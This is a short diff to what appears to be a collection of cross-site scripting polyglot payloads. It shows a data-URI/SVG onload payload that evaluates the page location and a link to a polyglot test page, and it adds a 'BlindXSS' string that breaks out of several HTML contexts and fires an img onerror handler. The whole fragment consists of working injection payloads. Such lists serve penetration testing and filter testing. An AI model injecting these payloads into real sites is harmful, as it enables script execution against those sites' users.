@@ -4,3 +4,6 @@ data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert
 
 #WASM
 https://vulnerabledoma.in/polyglot/wasmjscsshtml.html
+
+#BlindXSS
+'">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
